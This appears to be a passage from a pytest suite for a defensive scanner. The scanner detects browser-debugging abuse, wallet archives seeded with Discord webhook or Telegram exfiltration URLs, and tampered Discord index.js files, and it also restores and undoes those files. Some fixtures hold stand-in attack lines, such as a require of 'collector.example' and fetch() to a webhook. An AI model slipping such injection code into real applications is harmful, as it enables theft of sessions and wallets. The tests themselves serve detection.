    assert at.browser_profile(["firefox", "-profile", "/tmp/p"])[0] == "temp"
    assert at.browser_profile(["chrome.exe", "--profile-directory=Default"]) == ("default", "")  # not a user-data-dir


def test_browser_process_finding_and_masking():
    proc = at.BrowserProc(4242, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                          ["chrome.exe", "--headless", "--remote-debugging-port=9222", "--proxy-server=http://u:secret99@1.2.3.4:80"],
                          "DESKTOP\\bob", time.time() - 90)
    r = risk(proc.name, proc.argv, proc.exe)
    f = at.browser_process_finding(proc, r)
    assert f.rule_id == "AEG-TAMPER-BROWSER-DEBUG" and f.severity == Severity.HIGH and f.category == "browser"
    assert f.location == r"C:\Program Files\Google\Chrome\Application\chrome.exe (pid 4242)"
    assert f.remediation.action == "kill_process"
    assert f.remediation.params == {"pid": 4242, "path": proc.exe, "quarantine": False}
    assert f.mitre == ["T1539", "T1185"] and f.evidence["pid"] == 4242 and f.evidence["profile"] == "default"
    assert f.evidence["hidden_by"] == ["headless"] and f.evidence["started"]
    assert "secret99" not in json.dumps(f.to_dict()) and "sign out" in f.recommendation
    ext = risk("chrome.exe", "chrome.exe --load-extension=C:\\Temp\\e")
    g = at.browser_process_finding(at.BrowserProc(7, "chrome.exe", "", ["chrome.exe"]), ext)
    assert g.rule_id == "AEG-TAMPER-BROWSER-EXT" and g.location == "chrome.exe (pid 7)" and g.mitre == ["T1176.001"]


def test_check_browser_processes(ctx, monkeypatch):
    procs = [
        at.BrowserProc(1, "chrome.exe", "", ["chrome.exe", "--headless", "--remote-debugging-port=9222"]),
        at.BrowserProc(2, "chrome.exe", "", ["chrome.exe", "--headless", "--remote-debugging-port=9222",
                                              r"--user-data-dir=C:\Users\x\AppData\Local\Temp\puppeteer_dev_chrome_profile-a"]),
        at.BrowserProc(3, "firefox.exe", "", ["firefox.exe"]),
    ]
    monkeypatch.setattr(at, "collect_browser_processes", lambda: procs)
    findings, checks = split(list(at.check_browser_processes(ctx)))
    assert [f.evidence["pid"] for f in findings] == [1] and checks[0].status == CheckStatus.FAIL
    assert "3 browser process(es) examined: 1" in checks[0].detail and ctx.stats["tamper_browser_procs"] == 3
    monkeypatch.setattr(at, "collect_browser_processes", lambda: procs[1:])
    findings, checks = split(list(at.check_browser_processes(ctx)))
    assert findings == [] and checks[0].status == CheckStatus.PASS


def test_collect_browser_processes_tolerates_psutil_errors(monkeypatch):
    import psutil

    class Proc:
        def __init__(self, info=None, exc=None):
            self._info, self._exc = info, exc

        @property
        def info(self):
            if self._exc:
                raise self._exc
            return self._info

    procs = [
        Proc({"pid": 10, "name": "chrome.exe", "exe": "C:\\c\\chrome.exe", "cmdline": ["chrome.exe", "--headless"], "username": "u",
              "create_time": 5.0}),
        Proc({"pid": 11, "name": "chrome.exe", "exe": None, "cmdline": ["chrome.exe", "--type=renderer"], "username": None, "create_time": None}),
        Proc({"pid": 12, "name": "notepad.exe", "exe": "", "cmdline": ["notepad.exe"], "username": "u", "create_time": 1.0}),
        Proc(exc=psutil.NoSuchProcess(13)), Proc(exc=psutil.AccessDenied(14)), Proc(exc=psutil.ZombieProcess(15)),
        Proc({"pid": 16, "name": "firefox", "exe": None, "cmdline": None, "username": None, "create_time": None}),
        Proc({"pid": 17, "name": None, "exe": None, "cmdline": None, "username": None, "create_time": None}),
        Proc(exc=RuntimeError("boom")),
    ]
    monkeypatch.setattr(psutil, "process_iter", lambda attrs=None: iter(procs))
    got = at.collect_browser_processes()
    assert [(p.pid, p.name) for p in got] == [(10, "chrome.exe"), (16, "firefox")]
    assert got[0].argv == ["chrome.exe", "--headless"] and got[1].argv == [] and got[1].create_time == 0.0


# =========================================================================== crypto-wallet apps
def asar_bytes(*parts, pad=2048):
    return b"\x04\x00\x00\x00{\"files\":{}}" + b"var a = 1;\n" * (pad // 11) + b"".join(parts)


def write_asar(path, *parts, pad=2048):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(asar_bytes(*parts, pad=pad))
    return path


def test_search_asar_markers(tmp_path):
    token = "aB3dE5gH7jK9mN1pQ3sT5vX7yZ2bC4dE6fG8"
    hit = at.search_asar_markers(write_asar(tmp_path / "a.asar", b"fetch('" + webhook_url(token).encode() + b"')"))
    assert [h.name for h in hit.hits] == ["Discord webhook URL"] and hit.complete and hit.bytes_read > 2000
    assert "webhooks/1234567890123456789/***" in hit.hits[0].excerpt and token[:8] not in hit.hits[0].excerpt
    assert hit.hits[0].offset > 2000
    tg = at.search_asar_markers(write_asar(tmp_path / "t.asar", telegram_url().encode()))
    assert [h.name for h in tg.hits] == ["Telegram bot API URL"] and "AAHx9Zy8" not in tg.hits[0].excerpt
    upper = at.search_asar_markers(write_asar(tmp_path / "u.asar", webhook_url().upper().replace("HTTPS", "https").encode()))
    assert upper.hits and upper.hits[0].name == "Discord webhook URL"
    both = at.search_asar_markers(write_asar(tmp_path / "b.asar", webhook_url().encode(), b"\n", telegram_url().encode()))
    assert sorted(h.name for h in both.hits) == ["Discord webhook URL", "Telegram bot API URL"]  # same chunk: both reported


def test_search_asar_ignores_documentation_placeholders_and_clean_files(tmp_path):
    clean = write_asar(tmp_path / "clean.asar", b"https://discord.com/api/webhooks/<id>/<token> docs, discord.com/api/v9/users/@me")
    res = at.search_asar_markers(clean)
    assert res.hits == [] and res.complete
    short = write_asar(tmp_path / "short.asar", b"discord.com/api/webhooks/123/abc")
    assert at.search_asar_markers(short).hits == []  # too short to be a real id / token
    assert at.search_asar_markers(write_asar(tmp_path / "empty.asar", pad=0)).hits == []
    (tmp_path / "zero.asar").write_bytes(b"")
    assert at.search_asar_markers(tmp_path / "zero.asar").hits == []
    with pytest.raises(OSError):
        at.search_asar_markers(tmp_path / "missing.asar")


def test_search_asar_marker_across_chunk_boundaries(tmp_path):
    url = webhook_url().encode()
    for lead in range(0, 130, 7):  # slide the marker over every alignment of the 128 byte chunks
        body = b"." * lead + url + b"." * 400
        p = tmp_path / f"b{lead}.asar"
        p.write_bytes(body)
        res = at.search_asar_markers(p, chunk_size=128, overlap=len(url) + 8)
        assert [h.name for h in res.hits] == ["Discord webhook URL"], lead
        assert res.hits[0].offset == lead + url.index(b"discord.com"), lead  # absolute offset of the match
    big = tmp_path / "big.asar"
    chunk = at.ASAR_CHUNK
    big.write_bytes(b"\0" * (chunk - 20) + url + b"\0" * (chunk // 2))  # straddles the default 4 MiB boundary
    res = at.search_asar_markers(big)
    assert res.hits and res.hits[0].offset == chunk - 20 + url.index(b"discord.com")


def test_search_asar_stops_at_first_hit_and_honours_caps(tmp_path):
    url = webhook_url().encode()
    p = tmp_path / "x.asar"
    p.write_bytes(b"." * 300 + url + b"." * 2000 + telegram_url().encode())
    res = at.search_asar_markers(p, chunk_size=1024, overlap=256)
    assert [h.name for h in res.hits] == ["Discord webhook URL"] and res.bytes_read == 1024  # the later hit is never read
    late = tmp_path / "late.asar"
    late.write_bytes(b"." * 5000 + url)
    capped = at.search_asar_markers(late, max_bytes=4096, chunk_size=1024)
    assert capped.hits == [] and capped.complete is False and capped.bytes_read == 4096
    exact = tmp_path / "exact.asar"
    exact.write_bytes(b"." * 4096)
    assert at.search_asar_markers(exact, max_bytes=4096, chunk_size=1024).complete is True
    stopper = at.search_asar_markers(late, chunk_size=1024, should_stop=lambda: True)
    assert stopper.complete is False and stopper.bytes_read == 0 and stopper.hits == []


@pytest.mark.parametrize("delta_days,expected", [(0, False), (-5, False), (2.9, False), (3.0, False), (3.01, True), (40, True)])
def test_asar_newer_than_executable_threshold(delta_days, expected):
    exe = 1_700_000_000.0
    assert at.asar_swapped_after_install(exe + delta_days * 86400, exe) is expected


def test_wallet_discovery_per_platform(tmp_path):
    home, local = tmp_path / "home", tmp_path / "Local"

    def touch(p):
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(b"x")

    touch(local / "exodus/app-24.1.0/resources/app.asar")
    touch(local / "exodus/app-24.1.0/Exodus.exe")
    touch(local / "exodus/app-23.9.0/resources/app.asar")  # an older version without its exe
    touch(local / "Programs/atomic/resources/app.asar")
    touch(local / "Programs/atomic/Atomic Wallet.exe")
    touch(local / "Programs/ledger-live-desktop/resources/app.asar")
    touch(local / "Programs/other-wallet/resources/app.asar")
    found = at.find_wallet_installs("windows", home, local)
    by = {(w.wallet, w.asar.parent.parent.name): w for w in found}
    assert set(by) == {("Exodus", "app-24.1.0"), ("Exodus", "app-23.9.0"), ("Atomic Wallet", "atomic"), ("Ledger Live", "ledger-live-desktop")}
    assert by[("Exodus", "app-24.1.0")].exe.name == "Exodus.exe" and by[("Exodus", "app-23.9.0")].exe is None
    assert by[("Atomic Wallet", "atomic")].exe.name == "Atomic Wallet.exe" and by[("Ledger Live", "ledger-live-desktop")].exe is None

    touch(home / "Applications/Exodus.app/Contents/Resources/app.asar")
    touch(home / "Applications/Exodus.app/Contents/MacOS/Exodus")
    touch(home / "Applications/Ledger Live.app/Contents/Resources/app.asar")
    mine = [w for w in at.find_wallet_installs("darwin", home, local) if str(w.asar).startswith(str(home))]
    assert sorted(w.wallet for w in mine) == ["Exodus", "Ledger Live"]
    assert [w.exe.name for w in mine if w.wallet == "Exodus"] == ["Exodus"]

    touch(home / ".local/share/exodus-linux-x64/resources/app.asar")
    touch(home / ".local/share/exodus-linux-x64/Exodus")
    lin = [w for w in at.find_wallet_installs("linux", home, local) if str(w.asar).startswith(str(home))]
    assert [(w.wallet, w.exe.name) for w in lin] == [("Exodus", "Exodus")]
    assert [w for w in at.find_wallet_installs("windows", tmp_path / "nobody", tmp_path / "nowhere")] == []


def wallet(tmp_path, asar_name="app.asar"):
    asar = tmp_path / "app" / "resources" / asar_name
    exe = tmp_path / "app" / "Exodus.exe"
    return at.WalletInstall("Exodus", asar, exe)


def test_wallet_findings_marker_is_critical():
    inst = at.WalletInstall("Exodus", Path("/x/resources/app.asar"), Path("/x/Exodus.exe"))
    search = at.AsarSearch([at.MarkerHit("Discord webhook URL", 1234, "discord.com/api/webhooks/1/***")], 1000)
    (f,) = at.wallet_findings(inst, search, 2_000_000_000.0, 99, 1_000_000_000.0)
    assert f.rule_id == "AEG-TAMPER-WALLET" and f.severity == Severity.CRITICAL and f.category == "malware"
    assert f.remediation is None and f.mitre == ["T1554", "T1567"] and f.location == str(inst.asar)
    assert f.title == "Exodus wallet app was tampered with (it contains data-theft code)"
    for phrase in ("clean device", "new recovery phrase", "reinstall", "official website"):
        assert phrase in f.recommendation
    assert f.evidence["markers"] == ["Discord webhook URL"] and f.evidence["offset"] == 1234 and "days_newer" not in f.evidence


def test_wallet_findings_newer_asar_is_medium_and_marker_wins():
    inst = at.WalletInstall("Ledger Live", Path("/x/resources/app.asar"), Path("/x/Ledger Live.exe"))
    day = 86400.0
    (f,) = at.wallet_findings(inst, at.AsarSearch(), 1_000_000_000.0 + 10 * day, 5, 1_000_000_000.0)
    assert f.rule_id == "AEG-TAMPER-WALLET-CHANGED" and f.severity == Severity.MEDIUM and f.mitre == ["T1554"]
    assert f.title == "Wallet app code changed after it was installed: Ledger Live" and f.remediation is None
    assert f.evidence["days_newer"] == 10.0 and "10 days" in f.description
    assert at.wallet_findings(inst, at.AsarSearch(), 1_000_000_000.0 + 2 * day, 5, 1_000_000_000.0) == []
    assert at.wallet_findings(inst, at.AsarSearch(), 1_000_000_000.0 + 20 * day, 5, None) == []  # no executable to compare with
    hit = at.AsarSearch([at.MarkerHit("Telegram bot API URL", 5, "x")], 10)
    assert [x.rule_id for x in at.wallet_findings(inst, hit, 1_000_000_000.0 + 20 * day, 5, 1_000_000_000.0)] == ["AEG-TAMPER-WALLET"]


def test_check_wallets_with_real_files(ctx, tmp_path, monkeypatch):
    monkeypatch.setattr(at, "find_wallets", lambda: [])
    assert [(c.check_id, c.status) for c in at.check_wallets(ctx)] == [("AEG-TAMPER-WALLET", CheckStatus.SKIP)]

    day = 86400
    base = 1_700_000_000
    installs = {}
    for name, parts, asar_age in (("infected", [webhook_url().encode()], 0), ("swapped", [], 5 * day),
                                  ("clean", [], 0), ("updated", [], 2 * day)):
        inst = wallet(tmp_path / name)
        write_asar(inst.asar, *parts)
        inst.exe.write_bytes(b"MZ")
        os.utime(inst.exe, (base, base))
        os.utime(inst.asar, (base + asar_age, base + asar_age))
        installs[name] = at.WalletInstall("Exodus" if name != "clean" else "Atomic Wallet", inst.asar, inst.exe)
    noexe = at.WalletInstall("Ledger Live", write_asar(tmp_path / "noexe" / "resources" / "app.asar"), None)
    monkeypatch.setattr(at, "find_wallets", lambda: list(installs.values()) + [noexe])
    findings, checks = split(list(at.check_wallets(ctx)))
    by = {Path(f.location).parents[2].name: f for f in findings}
    assert set(by) == {"infected", "swapped"}
    assert by["infected"].rule_id == "AEG-TAMPER-WALLET" and by["infected"].severity == Severity.CRITICAL
    assert by["swapped"].rule_id == "AEG-TAMPER-WALLET-CHANGED" and by["swapped"].severity == Severity.MEDIUM
    assert checks[0].status == CheckStatus.FAIL and "5 wallet app archive(s) checked" in checks[0].detail
    assert ctx.stats["tamper_wallets"] == 5

    monkeypatch.setattr(at, "find_wallets", lambda: [installs["clean"], installs["updated"], noexe])
    findings, checks = split(list(at.check_wallets(ctx)))
    assert findings == [] and checks[0].status == CheckStatus.PASS and "Atomic Wallet" in checks[0].detail


def test_check_wallets_unreadable_archive_does_not_stop_the_other_wallets(ctx, tmp_path, monkeypatch):
    first, second = wallet(tmp_path / "a"), wallet(tmp_path / "b")
    for inst in (first, second):
        write_asar(inst.asar, webhook_url().encode() if inst is second else b"")
        inst.exe.write_bytes(b"MZ")
    real = at.search_asar_markers

    def flaky(path, **kw):
        if Path(path) == first.asar:
            raise PermissionError(13, "Permission denied")
        return real(path, **kw)

    monkeypatch.setattr(at, "find_wallets", lambda: [first, second])
    monkeypatch.setattr(at, "search_asar_markers", flaky)
    findings, checks = split(list(at.check_wallets(ctx)))
    assert [f.rule_id for f in findings] == ["AEG-TAMPER-WALLET"] and Path(findings[0].location) == second.asar
    assert checks[0].status == CheckStatus.FAIL and "Exodus: app.asar could not be read (Permission denied)" in checks[0].detail


def test_check_wallets_notes_incomplete_search_and_skips_vanished_files(ctx, tmp_path, monkeypatch):
    inst = wallet(tmp_path)
    write_asar(inst.asar)
    inst.exe.write_bytes(b"MZ")
    ghost = at.WalletInstall("Atomic Wallet", tmp_path / "ghost" / "app.asar", None)
    monkeypatch.setattr(at, "find_wallets", lambda: [inst, ghost])
    monkeypatch.setattr(at, "search_asar_markers", lambda p, should_stop=None: at.AsarSearch([], 3 * 1024 * 1024, complete=False))
    findings, checks = split(list(at.check_wallets(ctx)))
    assert findings == [] and checks[0].status == CheckStatus.PASS
    assert "2 wallet app archive(s) checked" in checks[0].detail and "Exodus: only the first 3 MB searched" in checks[0].detail


# =========================================================================== restore_file_content remediation + undo
TAMPERED = "module.exports = require('./core.asar');\nrequire('https://collector.example/x.js');\n"


@pytest.fixture
def cfg():
    return Config.load()


def discord_file(tmp_path, content=TAMPERED, folder="discord_desktop_core"):
    p = tmp_path / "modules" / folder / "index.js"
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(content if isinstance(content, bytes) else content.encode("utf-8"))
    return p


def fix(cfg, path, content=at.GENUINE_INDEX_JS):
    return rem.restore_file_content(cfg, {"path": str(path), "content": content}, FINDING)


def backups(cfg, kind="file"):
    return [e for e in undo.list_backups(cfg) if e["kind"] == kind]


def test_is_restorable_file():
    ok = ["/home/x/.config/discord/0.0.1/modules/discord_desktop_core/index.js",
          r"C:\Users\x\AppData\Local\Discord\app-1.0.9\modules\discord_desktop_core-1\discord_desktop_core\index.js",
          "C:/Users/x/AppData/Local/Discord/app-1/modules/discord_desktop_core-1/DISCORD_DESKTOP_CORE/INDEX.JS"]
    for p in ok:
        assert rem.is_restorable_file(p), p
    for p in ("/etc/hosts", "/home/x/index.js", "/x/discord_desktop_core/other.js", "/x/discord_desktop_core/index.js.bak",
              "/x/xdiscord_desktop_core/index.js", "discord_desktop_core/index.js", "", r"C:\x\discord_desktop_core_old\index.js",
              "/x/discord_desktop_core/sub/index.js"):
        assert not rem.is_restorable_file(p), p


def test_restore_file_content_writes_genuine_line_and_backs_up(cfg, tmp_path):
    p = discord_file(tmp_path)
    ok, msg = fix(cfg, p)
    assert ok and "restored" in msg and p.read_bytes() == at.GENUINE_INDEX_JS.encode()
    (entry,) = backups(cfg)
    doc = json.loads(Path(entry["path"]).read_text(encoding="utf-8"))
    assert set(doc) == {"path", "content"} and doc["path"] == str(p) and doc["content"] == TAMPERED
    assert entry["undoable"] is True and "genuine content" in entry["summary"] and str(p) in entry["summary"]
    assert at.classify_discord_index(p.read_bytes()).status == "genuine"


def test_restore_file_content_through_apply_remediation(cfg, tmp_path):
    p = discord_file(tmp_path, "console.log('x')")
    finding = at.discord_finding("Discord", p, at.classify_discord_index(p.read_bytes()), p.read_bytes(), p.stat().st_size)
    ok, msg = rem.apply_remediation(finding, cfg)
    assert ok, msg
    assert p.read_text() == at.GENUINE_INDEX_JS and "restore_file_content" in rem.ACTIONS and "restore_file_content" not in rem.WINDOWS_ONLY


@pytest.mark.parametrize("content", [
    "module.exports = require('./core.asar');",
    'module.exports = require("./core.asar");\r\n',
    "  module.exports=require('./core.asar')  ",
])
def test_restore_file_content_accepts_the_genuine_forms(cfg, tmp_path, content):
    p = discord_file(tmp_path)
    assert fix(cfg, p, content)[0] and p.read_bytes() == content.encode()


def test_restore_file_content_refuses_other_paths(cfg, tmp_path):
    for name in ("index.js", "other.js"):
        p = tmp_path / "x" / name
        p.parent.mkdir(exist_ok=True)
        p.write_text("keep")
        ok, msg = fix(cfg, p)
        assert ok is False and "refused" in msg and p.read_text() == "keep"
    q = discord_file(tmp_path, "keep", folder="not_discord_desktop_core")
    assert fix(cfg, q)[0] is False and q.read_text() == "keep"
    r = tmp_path / "xdiscord_desktop_core" / "index.js"
    r.parent.mkdir()
    r.write_text("keep")
    assert fix(cfg, r)[0] is False and r.read_text() == "keep"
    assert fix(cfg, "")[0] is False and rem.restore_file_content(cfg, {}, FINDING)[0] is False
    assert backups(cfg) == []


@pytest.mark.parametrize("content", [
    "require('https://collector.example/x.js');", "module.exports = require('./core.asar');\nevil();", "", None, 5,
    "module.exports = require('./core.asar'); require('x');", "var a=1;module.exports = require('./core.asar');",
])
def test_restore_file_content_refuses_anything_but_the_genuine_content(cfg, tmp_path, content):
    p = discord_file(tmp_path)
    ok, msg = fix(cfg, p, content)
    assert ok is False and "refused" in msg and p.read_text() == TAMPERED and backups(cfg) == []


def test_restore_file_content_missing_file_and_oversize(cfg, tmp_path, monkeypatch):
    p = tmp_path / "modules" / "discord_desktop_core" / "index.js"
    ok, msg = fix(cfg, p)
    assert ok is False and "no longer exists" in msg
    q = discord_file(tmp_path)
    monkeypatch.setattr(rem, "MAX_RESTORE_BACKUP_BYTES", 10)
    ok, msg = fix(cfg, q)
    assert ok is False and "too large" in msg and q.read_text() == TAMPERED


@pytest.mark.skipif(os.name == "nt", reason="unprivileged symlinks are not available on Windows CI")
def test_restore_file_content_refuses_links(cfg, tmp_path):
    target = tmp_path / "elsewhere.txt"
    target.write_text("do not touch")
    link = tmp_path / "modules" / "discord_desktop_core" / "index.js"
    link.parent.mkdir(parents=True)
    os.symlink(target, link)
    ok, msg = fix(cfg, link)
    assert ok is False and "link" in msg and target.read_text() == "do not touch" and backups(cfg) == []
    real = tmp_path / "real_dir"
    real.mkdir()
    (real / "index.js").write_text("do not touch either")
    (tmp_path / "m2").mkdir()
    os.symlink(real, tmp_path / "m2" / "discord_desktop_core")  # a folder link that leads somewhere else
    ok, msg = fix(cfg, tmp_path / "m2" / "discord_desktop_core" / "index.js")
    assert ok is False and "link" in msg and (real / "index.js").read_text() == "do not touch either"


def test_restore_file_content_handles_read_only_and_binary_files(cfg, tmp_path):
    import stat

    p = discord_file(tmp_path, b"\xff\xfe\x00 binary \x80 junk\r\n" + b"x" * 100)
    os.chmod(p, stat.S_IREAD)
    ok, msg = fix(cfg, p)
    assert ok, msg
    assert p.read_bytes() == at.GENUINE_INDEX_JS.encode()
    r = undo.undo(cfg, backups(cfg)[0]["id"])
    assert r["ok"] and r["changed"]
    assert p.read_bytes() == b"\xff\xfe\x00 binary \x80 junk\r\n" + b"x" * 100  # byte for byte, including CRLF


def test_undo_file_round_trip(cfg, tmp_path):
    p = discord_file(tmp_path)
    original = p.read_bytes()
    assert fix(cfg, p)[0]
    (e,) = backups(cfg)
    assert "file" in undo.KINDS and e["undone"] is None
    dry = undo.undo(cfg, e["id"], dry_run=True)
    assert dry["ok"] and not dry["changed"] and "dry run" in dry["message"] and p.read_bytes() == at.GENUINE_INDEX_JS.encode()
    r = undo.undo(cfg, e["id"])
    assert r["ok"] and r["changed"] and p.read_bytes() == original
    assert r["details"]["backup_id"] == e["id"] and r["details"]["kind"] == "file" and r["results"]
    assert backups(cfg)[0]["undone"]
    again = undo.undo(cfg, e["id"])
    assert again["ok"] is False and again["details"]["already_undone"]
    forced = undo.undo(cfg, e["id"], force=True)
    assert forced["ok"] and not forced["changed"] and "already matches" in forced["message"]


def test_undo_latest_picks_the_file_backup(cfg, tmp_path):
    p = discord_file(tmp_path)
    assert fix(cfg, p)[0]
    r = undo.undo(cfg, "latest")
    assert r["ok"] and r["changed"] and p.read_text() == TAMPERED
    assert "nothing left to undo" in undo.undo(cfg, "latest")["message"]


def write_file_backup(cfg, doc, name="file-20260101-000000-000001"):
    (cfg.backups_dir / f"{name}.json").write_text(json.dumps(doc), encoding="utf-8")
    return name


def test_undo_file_refuses_other_paths_and_bad_backups(cfg, tmp_path):
    other = tmp_path / "other.txt"
    other.write_text("keep me")
    name = write_file_backup(cfg, {"path": str(other), "content": "pwned"})
    r = undo.undo(cfg, name)
    assert r["ok"] is False and "refusing to overwrite" in r["message"] and other.read_text() == "keep me"
    sneaky = tmp_path / "discord_desktop_core_evil" / "index.js"
    sneaky.parent.mkdir()
    sneaky.write_text("keep me")
    name = write_file_backup(cfg, {"path": str(sneaky), "content": "pwned"}, "file-20260101-000000-000002")
    assert undo.undo(cfg, name)["ok"] is False and sneaky.read_text() == "keep me"
    incomplete = {"path": str(discord_file(tmp_path))}
    write_file_backup(cfg, incomplete, "file-20260101-000000-000003")
    entry = next(e for e in undo.list_backups(cfg) if e["id"] == "file-20260101-000000-000003")
    assert entry["undoable"] is False
    assert undo.undo(cfg, "file-20260101-000000-000003")["ok"] is False
    write_file_backup(cfg, {"path": 5, "content": None}, "file-20260101-000000-000004")
    assert undo.undo(cfg, "file-20260101-000000-000004")["ok"] is False
    write_file_backup(cfg, ["not", "a", "dict"], "file-20260101-000000-000005")
    assert undo.undo(cfg, "file-20260101-000000-000005")["ok"] is False


def test_undo_file_when_the_application_folder_is_gone(cfg, tmp_path):
    p = discord_file(tmp_path)
    assert fix(cfg, p)[0]
    shutil.rmtree(tmp_path / "modules")
    r = undo.undo(cfg, backups(cfg)[0]["id"])
    assert r["ok"] is False and "no longer exists" in r["message"]
    assert not (tmp_path / "modules").exists()


@pytest.mark.skipif(os.name == "nt", reason="unprivileged symlinks are not available on Windows CI")
def test_undo_file_refuses_links(cfg, tmp_path):
    p = discord_file(tmp_path)
    assert fix(cfg, p)[0]
    target = tmp_path / "elsewhere.txt"
    target.write_text("do not touch")
    p.unlink()
    os.symlink(target, p)
    r = undo.undo(cfg, backups(cfg)[0]["id"])
    assert r["ok"] is False and target.read_text() == "do not touch"


def test_file_backup_payload_is_what_undo_expects(cfg, tmp_path):
    """Guards the contract between core/remediation.py and protect/undo.py for the file kind."""
    p = discord_file(tmp_path)
    assert fix(cfg, p)[0]
    doc = json.loads(Path(backups(cfg)[0]["path"]).read_text(encoding="utf-8"))
    assert set(doc) == {"path", "content"}
    assert undo._summarise("file", doc, Path("x")).startswith("tampered file rewritten")
    assert undo._undoable("file", doc) and not undo._undoable("file", {"path": "x"}) and not undo._undoable("file", None)


# =========================================================================== the scanner itself
def test_scanner_is_registered_and_in_the_full_profile():
    from aegis.core.engine import PROFILES

    load_all()
    cls = REGISTRY["apptamper"]
    assert cls.name == "apptamper" and set(cls.platforms) == {"windows", "linux", "darwin"}
    assert cls.title == "Application tampering & session theft" and cls.description and cls().supported()
    assert PROFILES["full"][-1] == "apptamper" and PROFILES["full"].count("apptamper") == 1
    assert "apptamper" not in PROFILES["quick"] and "apptamper" not in PROFILES["audit"]


def fake_world(tmp_path, monkeypatch):
    """Everything the five checks discover, replaced by files in tmp_path and canned process / registry data."""
    bad = make_index(tmp_path, "d1/modules/discord_desktop_core/index.js",
                     "module.exports = require('./core.asar');\nfetch('" + webhook_url() + "');")
    mod = make_index(tmp_path, "d2/modules/discord_desktop_core/index.js",
                     "require('/home/x/.config/vencord/dist/patcher.js');\nmodule.exports = require('./core.asar');")
    good = make_index(tmp_path, "d3/modules/discord_desktop_core/index.js", at.GENUINE_INDEX_JS)
    monkeypatch.setattr(at, "find_discord_files", lambda: [("Discord", bad), ("Discord PTB", mod), ("Discord Canary", good)])

    monkeypatch.setattr(at, "IS_WINDOWS", True)
    monkeypatch.setattr(at, "read_environment_values", lambda: {"user": {"ELECTRON_RUN_AS_NODE": "1"},
                                                                  "machine": {"NODE_OPTIONS": "--require C:\\ProgramData\\h.js"}})
    lnks = {"Google Chrome.lnk": build_lnk(CHROME, args="--remote-debugging-port=9222"),
            "Firefox.lnk": build_lnk(r"C:\Windows\System32\cmd.exe", args="/c start firefox"),
            "ok.lnk": build_lnk(CHROME, args="--profile-directory=Default")}
    shortcuts = []
    for name, data in lnks.items():
        p = tmp_path / "lnk" / name
        p.parent.mkdir(exist_ok=True)
        p.write_bytes(data)
        shortcuts.append(p)
    monkeypatch.setattr(at, "find_shortcut_files", lambda: shortcuts)

    monkeypatch.setattr(at, "collect_browser_processes", lambda: [
        at.BrowserProc(100, "chrome.exe", "", ["chrome.exe", "--headless", "--remote-debugging-port=9222"]),
        at.BrowserProc(101, "chrome.exe", "", ["chrome.exe", "--load-extension=C:\\dev\\ext"]),
        at.BrowserProc(102, "firefox.exe", "", ["firefox.exe"])])

    infected = wallet(tmp_path / "w1")
    write_asar(infected.asar, telegram_url().encode())
    swapped = wallet(tmp_path / "w2")
    write_asar(swapped.asar)
    for w, age in ((infected, 0), (swapped, 9 * 86400)):
        w.exe.write_bytes(b"MZ")
        os.utime(w.exe, (1_700_000_000, 1_700_000_000))
        os.utime(w.asar, (1_700_000_000 + age, 1_700_000_000 + age))
    monkeypatch.setattr(at, "find_wallets", lambda: [infected, swapped])


def test_scanner_run_smoke_with_fake_data(ctx, tmp_path, monkeypatch):
    fake_world(tmp_path, monkeypatch)
    messages = []
    ctx.progress = lambda scanner, msg: messages.append((scanner, msg))
    out = list(at.AppTamperScanner().run(ctx))
    findings, checks = split(out)
    got = sorted((f.rule_id, f.severity.name) for f in findings)
    assert got == sorted([
        ("AEG-TAMPER-DISCORD", "CRITICAL"), ("AEG-TAMPER-DISCORD-MOD", "INFO"),
        ("AEG-TAMPER-ELECTRON-NODE", "HIGH"), ("AEG-TAMPER-NODE-OPTIONS", "HIGH"),
        ("AEG-TAMPER-LNK-DEBUG", "HIGH"), ("AEG-TAMPER-LNK-MASQUERADE", "HIGH"),
        ("AEG-TAMPER-BROWSER-DEBUG", "HIGH"), ("AEG-TAMPER-BROWSER-EXT", "MEDIUM"),
        ("AEG-TAMPER-WALLET", "CRITICAL"), ("AEG-TAMPER-WALLET-CHANGED", "MEDIUM")])
    assert [(c.check_id, c.status) for c in checks] == [
        ("AEG-TAMPER-DISCORD", CheckStatus.FAIL), ("AEG-TAMPER-ENV", CheckStatus.FAIL), ("AEG-TAMPER-SHORTCUTS", CheckStatus.FAIL),
        ("AEG-TAMPER-BROWSER-PROC", CheckStatus.FAIL), ("AEG-TAMPER-WALLET", CheckStatus.FAIL)]
    for f in findings:
        assert f.title and f.description and f.location and f.evidence and f.recommendation and f.mitre, f.rule_id
        if f.severity >= Severity.HIGH:
            assert f.remediation is not None or f.rule_id == "AEG-TAMPER-WALLET", f.rule_id
    actions = {f.rule_id: f.remediation.action for f in findings if f.remediation}
    assert actions["AEG-TAMPER-DISCORD"] == "restore_file_content" and actions["AEG-TAMPER-LNK-DEBUG"] == "quarantine_file"
    assert actions["AEG-TAMPER-ELECTRON-NODE"] == "delete_registry_value" and actions["AEG-TAMPER-BROWSER-DEBUG"] == "kill_process"
    assert "aB3dE5gH7jK9" not in json.dumps([x.to_dict() for x in out])  # secrets never reach the report
    assert {k: ctx.stats[k] for k in ("tamper_discord_files", "tamper_shortcuts", "tamper_browser_procs", "tamper_wallets")} == {
        "tamper_discord_files": 3, "tamper_shortcuts": 3, "tamper_browser_procs": 3, "tamper_wallets": 2}
    assert len([m for m in messages if m[0] == "apptamper" and m[1].startswith("checking")]) == 5


def test_scanner_run_all_clean(ctx, tmp_path, monkeypatch):
    good = make_index(tmp_path, "d/modules/discord_desktop_core/index.js", at.GENUINE_INDEX_JS)
    monkeypatch.setattr(at, "find_discord_files", lambda: [("Discord", good)])
    monkeypatch.setattr(at, "IS_WINDOWS", True)
    monkeypatch.setattr(at, "read_environment_values", lambda: {"user": {"TEMP": "x"}, "machine": {"NODE_OPTIONS": "--max-old-space-size=4096"}})
    monkeypatch.setattr(at, "find_shortcut_files", lambda: [])
    monkeypatch.setattr(at, "collect_browser_processes", lambda: [])
    monkeypatch.setattr(at, "find_wallets", lambda: [])
    findings, checks = split(list(at.AppTamperScanner().run(ctx)))
    assert findings == []
    assert [(c.check_id, c.status) for c in checks] == [
        ("AEG-TAMPER-DISCORD", CheckStatus.PASS), ("AEG-TAMPER-ENV", CheckStatus.PASS), ("AEG-TAMPER-SHORTCUTS", CheckStatus.PASS),
